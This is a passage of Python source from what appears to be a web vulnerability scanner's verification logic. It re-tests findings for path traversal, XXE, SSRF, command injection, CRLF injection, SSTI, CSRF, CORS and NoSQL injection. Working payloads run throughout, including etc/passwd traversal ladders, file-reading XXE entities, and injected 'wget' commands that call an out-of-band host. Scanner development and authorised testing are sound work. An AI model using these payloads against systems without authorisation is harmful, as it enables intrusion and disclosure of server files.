                # param-bare endpoint copy (the PT-2 pollution lesson).
                import random as _r46
                from urllib.parse import urlsplit as _us46
                from .detect import echo_neutralize as _ez46
                from .core import Endpoint as _E46
                base46 = _us46(ep.url).path.rstrip("/").rsplit("/", 1)[-1]
                ctrl46 = f"burhan-pn2-{_r46.randrange(1000, 99999)}"
                ep46 = _E46(url=ep.url, method=ep.method)
                ra = self.engine.send(RequestMutation(endpoint=ep46, param_name="..",
                                                      param_value=base46, note="vr-pname-known"))
                rb = self.engine.send(RequestMutation(endpoint=ep46, param_name=ctrl46,
                                                      param_value=base46, note="vr-pname-missing"))
                hit46 = False
                used46 = ""
                if ra is not None and rb is not None and not ra.error and not rb.error \
                        and ra.status and rb.status:
                    ba46 = _ez46(ra.body or "", "..")
                    bb46 = _ez46(rb.body or "", ctrl46, "..")
                    if ra.status != rb.status:
                        hit46, used46 = True, f"HTTP {ra.status} vs {rb.status}"
                    elif ba46 != bb46:
                        hit46, used46 = True, "normalized-echo-neutral differential"
                v = Verification(method="re-test:fresh-param-name-pair", passed=hit46,
                                 confidence=0.9 if hit46 else 0.15, rounds=2,
                                 notes=(f"fresh param-name pair reproduced the leak ({used46})"
                                        if hit46 else
                                        "fresh param-name pair did not reproduce the leak"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if hit46 else FindingStatus.REJECTED
                return f
            if "header_name_oracle" in kinds:
                # PT-2 VR: replay the header-NAME channel with a FRESH control
                # name — the structural constant ('..' — the base's parent,
                # must exist) vs a fresh burhan-random name (must not). The
                # differential must reproduce beyond the echoed names, with
                # the '..' token neutralized from BOTH bodies (symmetric).
                import random as _r44
                from .detect import echo_neutralize as _ez44
                ctrl44 = f"burhan-hn2-{_r44.randrange(1000, 99999)}"
                # PT-2: param-bare endpoint — the channel under test is the header
                # NAME; declared header params must not ride along (they would
                # arrive first and steal the first-non-standard-name slot)
                from .core import Endpoint as _E44
                ep44 = _E44(url=ep.url, method=ep.method)
                ra = self.engine.send(RequestMutation(endpoint=ep44, note="vr-hname-known",
                                                      extra_headers={"..": "1"}))
                rb = self.engine.send(RequestMutation(endpoint=ep44, note="vr-hname-missing",
                                                      extra_headers={ctrl44: "1"}))
                hit44 = False
                used44 = ""
                if ra is not None and rb is not None and not ra.error and not rb.error \
                        and ra.status and rb.status:
                    ba44 = _ez44(ra.body or "", "..")
                    bb44 = _ez44(rb.body or "", ctrl44, "..")
                    if ra.status != rb.status:
                        hit44, used44 = True, f"HTTP {ra.status} vs {rb.status}"
                    elif ba44 != bb44:
                        hit44, used44 = True, "normalized-echo-neutral differential"
                v = Verification(method="re-test:fresh-header-name-pair", passed=hit44,
                                 confidence=0.9 if hit44 else 0.15, rounds=2,
                                 notes=(f"fresh header-name pair reproduced the leak ({used44})"
                                        if hit44 else
                                        "fresh header-name pair did not reproduce the leak"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if hit44 else FindingStatus.REJECTED
                return f
            if "exists_oracle" in kinds:
                import random as _r43
                from .detect import entity_normalize as _en43
                miss2 = f"burhan-miss-{_r43.randrange(1000, 99999)}"
                hit = False
                used43 = ""
                for depth43 in (6, 9):
                    up43 = "../" * depth43
                    rk43 = self._replay(ep, f.parameter, up43 + "etc/passwd")
                    rm43 = self._replay(ep, f.parameter, up43 + "etc/" + miss2)
                    if rk43 is None or rm43 is None or rk43.error or rm43.error \
                            or not rk43.status or not rm43.status:
                        continue
                    if rk43.status != rm43.status:
                        hit, used43 = True, f"depth {depth43}: HTTP {rk43.status} vs {rm43.status}"
                        break
                    # GTP-12a: transformation-aware echo neutralization (the
                    # plain replace missed the %-encoded + last-char-stripped
                    # echo and false-verified crypto servlets — 6 live FPs).
                    from .detect import echo_neutralize as _ez43
                    bk43 = _ez43(rk43.body or "", up43 + "etc/passwd", "etc/passwd")
                    bm43 = _ez43(rm43.body or "", up43 + "etc/" + miss2, "etc/" + miss2)
                    bk43 = bk43.replace(miss2, "")
                    # GTP-03b(w3): drop the >8 length gate — the real exists-oracle
                    # answers are 4B apart ('already exists.' 23B vs "doesn't exist
                    # yet." 27B); after echo neutralization any remaining difference
                    # IS the oracle's answer (49 candidates died at this gate live).
                    if bk43 != bm43:
                        # PT-1b: echo-derivative guard -- a SECOND independent
                        # missing payload must answer identically to the first;
                        # a surface that echoes a transformed derivative of the
                        # param (cipher/digest) differs on ANY two payloads and
                        # is not a file-existence signal (live-caught: 9 crypto/
                        # hash FPs on the round-7 full-benchmark re-run).
                        miss2v = f"burhan-miss2-{_r43.randrange(1000, 99999)}"
                        rm2v = self._replay(ep, f.parameter, up43 + "etc/" + miss2v)
                        if rm2v is not None and not rm2v.error and rm2v.status:
                            bm2v = _ez43(rm2v.body or "", up43 + "etc/" + miss2v,
                                         "etc/" + miss2v, miss2v)
                            if bm2v != bm43:
                                continue    # echo-derivative surface
                        hit, used43 = True, f"depth {depth43}: normalized-echo-neutral"
                        break
                if not hit:
                    # GTP-03c: the WRITABILITY axis replay — write-capable sinks
                    # answer identical empties on the existence pair.
                    wr2 = f"burhan-w-{_r43.randrange(1000, 99999)}"
                    for depth43 in (6, 9):
                        up43 = "../" * depth43
                        ra = self._replay(ep, f.parameter, up43 + "tmp/" + wr2)
                        rb2 = self._replay(ep, f.parameter, up43 + "etc/" + wr2)
                        if ra is None or rb2 is None or ra.error or rb2.error \
                                or not ra.status or not rb2.status:
                            continue
                        ba = _ez43(ra.body or "", up43 + "tmp/" + wr2, "tmp/" + wr2, wr2)
                        bb2 = _ez43(rb2.body or "", up43 + "etc/" + wr2, "etc/" + wr2, wr2)
                        if ba != bb2:
                            # PT-1b: echo-derivative guard on the writability axis
                            wr2v = f"burhan-w2-{_r43.randrange(1000, 99999)}"
                            ra2v = self._replay(ep, f.parameter, up43 + "tmp/" + wr2v)
                            if ra2v is not None and not ra2v.error and ra2v.status:
                                ba2v = _ez43(ra2v.body or "", up43 + "tmp/" + wr2v,
                                             "tmp/" + wr2v, wr2v)
                                if ba2v != ba:
                                    continue    # echo-derivative surface
                            hit, used43 = True, f"writability axis depth {depth43}"
                            break
                v = Verification(method="re-test:fresh-exists-pair", passed=hit,
                                 confidence=0.9 if hit else 0.15, rounds=2,
                                 notes=(f"fresh known-vs-missing pair reproduced the leak "
                                        f"({used43})" if hit else
                                        "fresh existence pair did not reproduce the leak"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if hit else FindingStatus.REJECTED
                return f
            if "writability_oracle" in kinds:
                # GTP-03c VR: replay the writability axis with a FRESH marker —
                # writable (ladder+tmp) vs unwritable (ladder+etc) must differ
                # again beyond the echo on a write-capable sink.
                import random as _r45
                from .detect import echo_neutralize as _ez45
                hit = False
                used45 = ""
                wr3 = f"burhan-w-{_r45.randrange(1000, 99999)}"
                for depth45 in (6, 9):
                    up45 = "../" * depth45
                    ra45 = self._replay(ep, f.parameter, up45 + "tmp/" + wr3)
                    rb45 = self._replay(ep, f.parameter, up45 + "etc/" + wr3)
                    if ra45 is None or rb45 is None or ra45.error or rb45.error \
                            or not ra45.status or not rb45.status:
                        continue
                    ba45 = _ez45(ra45.body or "", up45 + "tmp/" + wr3, "tmp/" + wr3, wr3)
                    bb45 = _ez45(rb45.body or "", up45 + "etc/" + wr3, "etc/" + wr3, wr3)
                    if ba45 != bb45:
                        # PT-1b: echo-derivative guard -- a second independent
                        # writable-dir payload must answer identically
                        wr45b = f"burhan-w2-{_r45.randrange(1000, 99999)}"
                        ra45b = self._replay(ep, f.parameter, up45 + "tmp/" + wr45b)
                        if ra45b is not None and not ra45b.error and ra45b.status:
                            ba45b = _ez45(ra45b.body or "", up45 + "tmp/" + wr45b,
                                          "tmp/" + wr45b, wr45b)
                            if ba45b != ba45:
                                continue    # echo-derivative surface
                        hit, used45 = True, f"writability depth {depth45}"
                        break
                v = Verification(method="re-test:fresh-writability-pair", passed=hit,
                                 confidence=0.9 if hit else 0.15, rounds=2,
                                 notes=(f"fresh writability pair reproduced the leak "
                                        f"({used45})" if hit else
                                        "fresh writability pair did not reproduce"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if hit else FindingStatus.REJECTED
                return f
            from .detect import entity_normalize as _en44
            ev = str(f.evidence)
            if "win.ini" in ev or "[fonts]" in ev:
                variants = ["../" * 4 + "windows/win.ini", "../" * 6 + "windows/win.ini", "../" * 8 + "windows/win.ini"]
                markers = ("[fonts]",)
            elif "passwd" in ev or "root:x" in ev:
                variants = ["../" * 6 + "etc/passwd", "../" * 8 + "etc/passwd"]
                markers = ("root:x:0:0:",)
            else:
                variants = ["../" * 4 + "secret.txt", "../" * 6 + "secret.txt"]
                markers = ("BURHAN-SECRET-FILE",)
            hit = False
            used = ""
            for alt in variants:
                r = self._replay(ep, f.parameter, alt)
                if any(m in _en44((r.body or "")) for m in markers):
                    hit, used = True, alt
                    break
            v = Verification(method="re-test:same-marker-alt-depth", passed=hit,
                             confidence=0.9 if hit else 0.15, rounds=len(variants),
                             notes=f"alternative depth payload {used[:40]!r} reproduces leak: {hit}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if hit else FindingStatus.REJECTED

        elif f.type == "open_redirect":
            # iv14 @ 23c4619 (transferred to main per supervisor order
            # 2026-10-12): sink-CONTEXT verifier contract. The re-test replay
            # must place the second host INSIDE a redirect sink expression in
            # the replayed body — the SAME CLIENT_REDIRECT_SINK_RE the detector
            # fires on, so detector and verifier can never disagree on what a
            # sink is. The old ±200-char keyword window (OWSP-29) VERIFIED
            # forged candidates on mere reflection pages: an unrelated sink
            # near a raw echo — the verification half of the structural FP
            # (Task-32 audit part 3). A Location header hit is unchanged
            # (that IS the header oracle).
            r = self._replay(ep, f.parameter, "https://burhan-redirect-check.example.org/second")
            if r is not None and "burhan-redirect-check.example.org" in (
                    (r.headers or {}).get("location", "") or ""):
                ok = True
                note = "second-host Location header redirect reproduced"
            elif r is not None and "burhan-redirect-check.example.org" in (r.body or ""):
                sx = RedirectDetector.CLIENT_REDIRECT_SINK_RE.search(r.body or "")
                if sx:
                    ok = True
                    note = ("second-host host inside a client redirect sink expression "
                            "(sink-context contract)")
                else:
                    ok = False
                    note = ("second-host URL present in body but NOT inside any redirect "
                            "sink expression (raw reflection — iv14 sink-context contract)")
            else:
                ok = False
                note = "second-host neither redirected nor present in body"
            v = Verification(method="re-test:second-host", passed=ok,
                             confidence=0.85 if ok else 0.2, rounds=1, notes=note)
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED

        elif f.type == "http_response_header_injection":
            # VR-05 (live-caught on ginandjuice.shop /catalog?category=): re-test with a
            # DIFFERENT header name — if the server still splits our injected header out
            # of the param value, header injection is independently confirmed.
            r = self._replay(ep, f.parameter, "burhancrlf2\r\nX-Burhan-Verify-Hdr: confirmed")
            v2 = (r.headers or {}).get("x-burhan-verify-hdr", "")
            ok = bool(v2)
            v = Verification(method="re-test:fresh-header-name", passed=ok,
                             confidence=0.9 if ok else 0.15, rounds=1,
                             notes=f"fresh vector split response header x-burhan-verify-hdr={v2!r}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED

        elif f.type == "xxe":
            # VR-07 (Phase 49): OOB-confirmed blind XXE — independent replay with a
            # FRESH interaction id. The first callback proved the target fetches
            # external entities; the second, with a never-used id, proves it is
            # reproducible and not a coincidental single fetch. Response-independent
            # by construction: the evidence channel is the callback itself.
            if any(e.kind == "oob_callback" for e in f.evidence) and self.oast is not None:
                import re as _re7
                ev7 = " ".join(e.detail for e in f.evidence)
                mroot = _re7.search(r"root=(\w+)", ev7)
                root = mroot.group(1) if mroot else "request"
                elem = f.parameter or "storeId"
                from .detect import XxeDetector, is_self_callback
                xd = XxeDetector(self.engine, self.bus)
                fields = [(p.name, p.value or "1") for p in ep.parameters] if ep else []
                iid = xd._oob_iid(ep, elem, "verify")
                xml = xd._xml(root, fields, self.oast.url(iid), elem)
                rv = self.engine.send(RequestMutation(
                    endpoint=ep, body_override=xml, method="POST",
                    extra_headers={"Content-Type": "application/xml"}))
                hit = self.oast.poll(iid, timeout=2.0) if not rv.error else None
                if hit and is_self_callback(hit, rv, self.oast.url(iid)):
                    hit = None                         # ENG-08: scanner-initiated fetch
                ok = hit is not None
                # Phase 52 (VR-08): attribution on the verify replay too — the fresh
                # interaction must come back and, on public channels, its source IP
                # is recorded in the verification notes (auditable evidence chain).
                src = ""
                if ok:
                    src = hit[0].get("ip") or ""
                    src = f" src={src}" if src else ""
                v = Verification(method="re-test:fresh-interaction-id", passed=ok,
                                 confidence=0.9 if ok else 0.15, rounds=1,
                                 notes=f"fresh interaction id {iid} fetched out-of-band: {ok}"
                                       f"{src} channel={getattr(self.oast, 'channel', 'local')}")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
                self.bus.emit("VerificationCompleted", finding=f.id, type=f.type,
                              passed=f.verification.passed if f.verification else False,
                              status=f.status.value, confidence=f.confidence)
                return f
            # VR-06 (live-caught on ginandjuice.shop /catalog/product/stock): independent
            # replay with FRESH files (/etc/group, /etc/lsb-release) and a fresh control.
            # Entity resolution is confirmed only if the control is STABLE (probed twice,
            # must match — random-response targets fail here) AND BOTH fresh files change
            # the response relative to that control — same oracle class, disjoint payloads.
            import re as _re2
            evtxt = str(f.evidence)
            mroot = _re2.search(r"root=(\w+)", evtxt)
            root = mroot.group(1) if mroot else "request"
            elem = f.parameter or "storeId"
            from .detect import XxeDetector
            xd = XxeDetector(self.engine, self.bus)
            fields = [(p.name, p.value or "1") for p in ep.parameters] if ep else []
            fresh_ctrl = "file:///nonexistent-burhan-verify"
            fresh_files = ["file:///etc/group", "file:///etc/lsb-release"]

            def _send_xml(fpath):
                return self.engine.send(RequestMutation(
                    endpoint=ep, body_override=xd._xml(root, fields, fpath, elem),
                    method="POST", extra_headers={"Content-Type": "application/xml"}))
            rc1, rc2 = _send_xml(fresh_ctrl), _send_xml(fresh_ctrl)
            stable_ctrl = (rc1.status == rc2.status and (rc1.body or "") == (rc2.body or ""))
            hits = 0
            if stable_ctrl:
                for ff in fresh_files:
                    rp = _send_xml(ff)
                    if rp.status != rc1.status or (rp.body or "") != (rc1.body or ""):
                        hits += 1
            ok = stable_ctrl and hits >= 2
            v = Verification(method="re-test:fresh-entity-files", passed=ok,
                             confidence=0.9 if ok else 0.15, rounds=4,
                             notes=f"stable control={stable_ctrl}; fresh files differing from fresh control: {hits}/2 "
                                   f"(root={root}, element={elem})")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED

        elif f.type == "ssrf" and any(e.kind == "oob_callback" for e in f.evidence) and self.oast is not None:
            # VR-09 (Phase 53): independent replay with a FRESH interaction id — the
            # first callback proved the app fetches attacker URLs server-side; the
            # second, never-used id proves reproducibility (same channel discipline
            # as VR-07 blind XXE).
            import re as _re9
            ev9 = " ".join(e.detail for e in f.evidence)
            m9 = _re9.search(r"param=([\w.-]+)", ev9)
            param9 = m9.group(1) if m9 else (f.parameter or "url")
            from .detect import SsrfDetector, is_self_callback
            sd = SsrfDetector(self.engine, self.bus)
            iid = sd._iid(ep, param9, "verify")
            rv = self.engine.send(RequestMutation(endpoint=ep, param_name=param9,
                                                  param_value=self.oast.url(iid), note="ssrf-verify"))
            hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
            if hit is None and rv is not None and not rv.error:
                # OWSP-32 (NodeGoat round, live-caught on /research?url=&symbol=):
                # the companion-gated fetch shape — the plain replay ships empty
                # sibling query params verbatim and the server-side fetch never
                # executes (if (req.query.symbol) stays falsy). The FILLER twin
                # gives empty companions a benign constant, mirroring the
                # detector's twin probes; without it every candidate of this
                # shape dies at verification.
                rv = self.engine.send(RequestMutation(endpoint=ep, param_name=param9,
                                                      param_value=self.oast.url(iid),
                                                      note="ssrf-verify-fill",
                                                      fill_query_siblings=True))
                hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
            if hit and is_self_callback(hit, rv, self.oast.url(iid)):
                hit = None                             # ENG-08: scanner-initiated fetch
            ok = hit is not None
            src9 = hit[0].get("ip", "") if hit else ""
            v = Verification(method="re-test:fresh-interaction-id", passed=ok,
                             confidence=0.9 if ok else 0.15, rounds=1,
                             notes=f"fresh interaction id {iid} fetched out-of-band: {ok}"
                                   f"{' src=' + src9 if src9 else ''}"
                                   f" channel={getattr(self.oast, 'channel', 'local')}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED

        elif f.type == "command_injection" and any(e.kind == "oob_callback" for e in f.evidence) and self.oast is not None:
            # VR-11 (Phase 53): fresh interaction id + DIFFERENT shell syntax ('|' vs
            # the ';' / '&&' detection battery) — execution must reproduce through an
            # independent separator to be a finding.
            # CM-1 (cmdi recall round, live-caught on the OWASP Benchmark 8b67a88):
            # the replay now uses THE FORM THAT FIRED (the finding's evidence
            # carries form=...). Default (no marker) = the classic separator
            # battery — byte-compatible with every existing finding. The twin
            # replays use the ALTERNATE COMMAND (curl -> wget; both verified
            # present in the runtime image) instead of the alternate separator:
            # for envp-array and direct-argv sinks there IS no separator — an
            # envp entry defines a variable only when it is an assignment, and
            # Runtime.exec(String) is not a shell (live: 'localhost;' ENOENT).
            import re as _re11
            ev11 = " ".join(e.detail for e in f.evidence)
            m11 = _re11.search(r"param=([\w.-]+)", ev11)
            param11 = m11.group(1) if m11 else (f.parameter or "host")
            m11f = _re11.search(r"form=(\S+)", ev11)
            form11 = m11f.group(1) if m11f else "variant"
            base11 = "localhost"
            if ep is not None and ep.param(param11) is not None and ep.param(param11).value:
                base11 = ep.param(param11).value[:60]
            from .detect import CommandInjectionDetector, is_self_callback
            cd = CommandInjectionDetector(self.engine, self.bus)
            if form11.startswith("nc-"):
                # CM-2 (cmdi recall round, root cause A4 — the 15 name-channel
                # FNs, live-caught on the OWASP Benchmark 8b67a88): the payload
                # rode the parameter NAME (a resolver surface), so the replay
                # goes through the SAME channel — the nc form THAT FIRED, with
                # a FRESH iid and the ALTERNATE COMMAND (curl->wget, both
                # verified present in the runtime image; for these sinks the
                # separator cannot vary — the name is one whole token to the
                # resolver). The rename anchor follows the XS-1 discipline:
                # the first eligible QUERY param (value = its declared value,
                # the resolver burhan), else the URL's last path segment as
                # the burhan value (live on the Benchmark: the segment IS
                # the test id the resolver matches; a value-mutation replay
                # probes a channel the app never reads).
                from .detect import _clone_ep_rename_param, last_path_segment
                # NOTE: string-compare on location (x.location.value == "query")
                # like the sqli/xss VR blocks — ParamLocation is not imported at
                # this module's top level (a NameError here would silently drop
                # the whole finding through the orchestrator's per-detector
                # except; live-caught in the CM-2 unit trace).
                _qp = next((x for x in ep.parameters
                            if x.kind != ParamKind.TOKEN and not x.flow_control
                            and x.location.value == "query"), None) if ep is not None else None
                if _qp is not None:
                    _anchor_nc = _qp.name
                    _val_nc = _qp.value or "1"
                else:
                    _anchor_nc = (last_path_segment(ep.url) if ep is not None else "") or "nc"
                    _val_nc = _anchor_nc
                _base_nc = (_val_nc or "localhost")[:60]
                iid = cd._iid(ep, _anchor_nc, "nc-verify")
                if form11 == "nc-twin-env":
                    payload = f"FOO=wget -q {self.oast.url(iid)} ;"
                elif form11 == "nc-twin-direct":
                    payload = f"wget -q {self.oast.url(iid)}"
                else:
                    payload = f"{_base_nc}; wget -q {self.oast.url(iid)} ;"
                if _qp is not None:
                    epc = _clone_ep_rename_param(ep, _qp.name, payload)
                    rv = self.engine.send(RequestMutation(endpoint=epc, param_name=payload,
                                                          param_value=_val_nc, note="cmdi-nc-verify"))
                else:
                    rv = self.engine.send(RequestMutation(endpoint=ep, param_name=payload,
                                                          param_value=_val_nc, note="cmdi-nc-verify"))
                hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
                if hit and is_self_callback(hit, rv, self.oast.url(iid)):
                    hit = None                         # ENG-08: scanner-initiated fetch
                ok = hit is not None
                src11 = hit[0].get("ip", "") if hit else ""
                v = Verification(method="re-test:fresh-iid+alternate-command:name-channel",
                                 passed=ok, confidence=0.9 if ok else 0.15, rounds=1,
                                 notes=f"fresh id {iid} via the {form11} form as the param "
                                       f"NAME (wget alternate command) "
                                       f"executed out-of-band: {ok}"
                                       f"{' src=' + src11 if src11 else ''}"
                                       f" channel={getattr(self.oast, 'channel', 'local')}")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
                return f
            iid = cd._iid(ep, param11, "verify")
            if form11 == "twin-env":
                payload = f"FOO=wget -q {self.oast.url(iid)} ;"
            elif form11 == "twin-direct":
                payload = f"wget -q {self.oast.url(iid)}"
            else:
                payload = base11 + cd.VERIFY_TEMPLATE.format(u=self.oast.url(iid))
            rv = self.engine.send(RequestMutation(endpoint=ep, param_name=param11,
                                                  param_value=payload, note="cmdi-verify"))
            hit = self.oast.poll(iid, timeout=2.0) if (rv is not None and not rv.error) else None
            if hit and is_self_callback(hit, rv, self.oast.url(iid)):
                hit = None                             # ENG-08: scanner-initiated fetch
            ok = hit is not None
            src11 = hit[0].get("ip", "") if hit else ""
            v = Verification(method="re-test:fresh-interaction-id+alternate-syntax", passed=ok,
                             confidence=0.9 if ok else 0.15, rounds=1,
                             notes=f"fresh id {iid} via the {form11} form "
                                   "(wget alternate command) "
                                   f"executed out-of-band: {ok}"
                                   f"{' src=' + src11 if src11 else ''}"
                                   f" channel={getattr(self.oast, 'channel', 'local')}")
            if form11 == "variant":
                v = Verification(method="re-test:fresh-interaction-id+alternate-syntax", passed=ok,
                                 confidence=0.9 if ok else 0.15, rounds=1,
                                 notes=f"fresh id {iid} via alternate '|' syntax "
                                       f"executed out-of-band: {ok}"
                                       f"{' src=' + src11 if src11 else ''}"
                                       f" channel={getattr(self.oast, 'channel', 'local')}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED

        elif f.type == "cors_misconfig":
            # VR-10 (Phase 53): replay with a FRESH Origin value — arbitrary-origin
            # reflection WITH credentials must repeat on a never-probed origin.
            import hashlib as _hb10
            fresh = "https://cors-vr10-" + _hb10.sha1(f.endpoint_url.encode()).hexdigest()[:8] + ".example"
            r10 = self.engine.send(RequestMutation(endpoint=ep, note="cors-verify",
                                                   extra_headers={"Origin": fresh}))
            ok10 = False
            acao10 = ""
            if r10 is not None and not r10.error:
                acao10 = (r10.headers or {}).get("access-control-allow-origin", "")
                acac10 = (r10.headers or {}).get("access-control-allow-credentials", "")
                ok10 = fresh in acao10 and acac10.strip().lower() == "true"
            v = Verification(method="re-test:fresh-origin", passed=ok10,
                             confidence=0.9 if ok10 else 0.15, rounds=1,
                             notes=f"fresh origin {fresh} reflected with credentials: {ok10} "
                                   f"(acao={acao10[:60]!r})")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok10 else FindingStatus.REJECTED

        elif f.type == "ssti":
            # VR-12 (Phase 55): re-test the SAME syntax family with FRESH operands
            # (12*11 -> 132) — ambient "49"s cannot reproduce a fresh computation.
            import re as _re12
            ev12 = " ".join(e.detail for e in f.evidence)
            m12 = _re12.search(r"syntax=(\S+)", ev12)
            fam = m12.group(1) if m12 else "{{"
            _FAMS = {"{{": ("{{", "}}"), "${": ("${", "}"),
                     "<%=": ("<%= ", " %>"), "#{": ("#{", "}")}
            open_, close = _FAMS.get(fam, ("{{", "}}"))
            fresh = f"{open_}12*11{close}"
            expect = "132"
            r12 = self.engine.send(RequestMutation(endpoint=ep, param_name=f.parameter,
                                                   param_value=fresh, note="ssti-verify"))
            ok12 = False
            if r12 is not None and not r12.error and r12.ok:
                body12 = r12.body or ""
                ok12 = expect in body12 and fresh not in body12
            v = Verification(method="re-test:fresh-expression", passed=ok12,
                             confidence=0.9 if ok12 else 0.15, rounds=1,
                             notes=f"fresh expression {fresh!r} -> {expect} evaluated: {ok12}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if ok12 else FindingStatus.REJECTED

        elif f.type == "csrf":
            # VR-13 (v4.2.0 VF-02): the old oracle was `r.ok` — a bare HTTP 2xx
            # from a fresh hostile origin. That proves nothing about CSRF: it
            # never checked that the state-changing request DISCRIMINATES input
            # (a blanket-200 endpoint passes it vacuously). The oracle is now a
            # triple control:
            #   (1) same-origin baseline replay must be accepted (the request
            #       is state-changing and succeeds for the app's own origin),
            #   (2) a FRESH hostile Origin+Referer replay must be accepted with
            #       the SAME status and a similar body (cross-origin acceptance
            #       — the CSRF essence — for a never-probed origin),
            #   (3) a malformed-input control must be REJECTED (the endpoint
            #       validates input, so the 2xx is a real acceptance not blanket).
            # Reproduction failure -> REJECTED; reproduction WITHOUT input
            # discrimination -> CANDIDATE (plausible, unproven — never VERIFIED).
            import hashlib as _hb13
            fresh13 = "https://csrf-vr13-" + _hb13.sha1(f.endpoint_url.encode()).hexdigest()[:8] + ".example"
            r_base = self.engine.send(RequestMutation(endpoint=ep, note="csrf-verify-baseline"))
            r13 = self.engine.send(RequestMutation(endpoint=ep, note="csrf-verify",
                                                   extra_headers={"Origin": fresh13,
                                                                  "Referer": fresh13 + "/x"}))
            mut_p = next((p.name for p in ep.parameters
                          if p.kind != ParamKind.TOKEN), "") if ep is not None else ""
            r_ctrl = (self.engine.send(RequestMutation(endpoint=ep, param_name=mut_p,
                                                      param_value="", note="csrf-verify-control"))
                      if (ep is not None and mut_p) else None)
            ok13 = similar13 = False
            if r_base is not None and r13 is not None and not r_base.error and not r13.error:
                ok13 = r_base.ok and r13.ok and r13.status == r_base.status
                similar13 = abs(len(r13.body or "") - len(r_base.body or "")) \
                    <= max(150, 0.25 * max(len(r_base.body or "x"), 1))
            discriminating = (r_ctrl is None) or \
                (not r_ctrl.ok or r_ctrl.status != (r_base.status if r_base is not None else 0))
            okVR13 = bool(ok13 and similar13 and discriminating and mut_p)
            if okVR13:
                v = Verification(method="re-test:fresh-hostile-origin", passed=okVR13,
                                 confidence=0.85, rounds=3,
                                 notes=f"cross-origin replay from {fresh13} accepted "
                                       f"(baseline {r_base.status}, replay {r13.status}); malformed "
                                       f"control rejected ({r_ctrl.status}) — tokenless state-changing "
                                       f"request is cross-origin accepted AND input-discriminating")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED
            elif ok13 and similar13:
                # reproduced acceptance, but the endpoint does not discriminate
                # malformed input: the 2xx cannot be attributed to a real state
                # change — honest CANDIDATE, never VERIFIED on this oracle.
                v = Verification(method="unverified:no-input-discrimination", passed=False,
                                 confidence=0.3, rounds=3,
                                 notes=f"cross-origin replay from {fresh13} accepted "
                                       f"(baseline {r_base.status}, replay {r13.status}) BUT the "
                                       f"malformed control was also accepted "
                                       f"({r_ctrl.status if r_ctrl is not None else 'n/a'}) — "
                                       "a blanket-2xx endpoint cannot prove a state change; "
                                       "CSRF plausible, unproven")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.CANDIDATE
            else:
                v = Verification(method="re-test:fresh-hostile-origin", passed=False,
                                 confidence=0.15, rounds=3,
                                 notes=f"cross-origin replay from {fresh13} did not reproduce "
                                       f"the same-origin baseline (baseline "
                                       f"{getattr(r_base, 'status', 0)}, replay "
                                       f"{getattr(r13, 'status', 0)})")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED

        elif f.type == "unrestricted_file_upload":
            # VR-20 (OWSP-18, live-caught on DVWA 3.x /vulnerabilities/upload/):
            # verification by re-execution with a FRESH canary — re-upload a
            # benign burhan .txt through the same multipart shape, require the
            # filename echoed (acceptance) AND the file fetched back with the
            # fresh canary content intact (servability). Both rounds must carry
            # their own canary; a stale echo proves nothing.
            import hashlib as _hb20
            from .detect import UploadDetector
            f20 = next((p for p in (ep.parameters if ep is not None else [])
                        if getattr(p, "is_file", False)), None)
            if f20 is not None:
                canary20 = "v" + _hb20.sha1((f.id + "|vr20").encode()).hexdigest()[:9]
                ud = UploadDetector(self.engine, self.bus)
                f20b = ud._probe(ep, f20, canary=canary20)
                served20 = any(e.kind == "upload_served" for e in (f20b.evidence if f20b else []))
                accepted20 = f20b is not None
                ok20 = accepted20 and served20
                v = Verification(method="upload:fresh-canary-replay", passed=ok20,
                                 confidence=0.9 if ok20 else 0.15, rounds=2,
                                 notes=(f"fresh canary {canary20}: accepted={accepted20}, "
                                        f"served-with-content={served20}"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if ok20 else FindingStatus.REJECTED
            else:
                v = Verification(method="unverified:no-file-param", passed=False,
                                 confidence=0.1, rounds=0,
                                 notes="file param not found on the endpoint at verification time")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.REJECTED

        elif f.type == "nosql_injection":
            # OWSP-30/31 (NodeGoat round, live-caught on /allocations/1?threshold=):
            # findings produced by the injection BATTERY carry js_or_differential
            # and/or Mongo db_error evidence — the $ne operator-bypass replay below
            # is shape-wrong for them (it builds JSON bodies and expects an
            # auth-bypass flip). Route by evidence kind: the JS pair gets an
            # INDEPENDENT fresh-vector replay (comparison operators, not the
            # detection tautologies), the error family a 2-variant error-string
            # replay — the BR-01 spirit applied to JS sinks.
            kinds30 = {e.kind for e in (f.evidence or [])}
            if "js_or_differential" in kinds30 or "db_error" in kinds30:
                base30 = "1"
                if ep is not None and f.parameter:
                    bp = ep.param(f.parameter)
                    if bp is not None and (bp.value or "").isdigit():
                        base30 = bp.value
                rj1 = self._replay(ep, f.parameter, f"{base30}' || '2'>'1")
                rj2 = self._replay(ep, f.parameter, f"{base30}' && '1'>'2")
